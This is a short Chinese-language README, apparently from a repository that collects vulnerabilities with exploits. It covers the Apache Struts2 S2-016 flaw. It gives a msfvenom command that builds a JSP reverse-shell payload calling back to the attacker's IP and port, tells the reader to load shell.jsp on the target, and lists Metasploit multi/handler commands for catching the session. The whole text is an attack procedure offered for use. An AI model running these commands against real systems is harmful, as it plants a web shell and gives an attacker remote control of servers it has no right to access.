# 收集各种漏洞并给出exp
### [struts2-016](https://struts.apache.org/docs/s2-016.html)
struts2_collections.py中类Strus2_016详细给出了poc、exp
其中shell.jsp使用msfvenom生成

```shell
msfvenom -a x86 --platform windows -p java/jsp_shell_reverse_tcp LHOST=your ip LPORT=your port -o shell.jsp
```
访问http://target/shell.jsp
进入metasploit
```shell
msf> use exploit/multi/handler
msf> set LHOST your ip
msf> set LPORT your port
msf> exploit -j
```
等待sessions完成
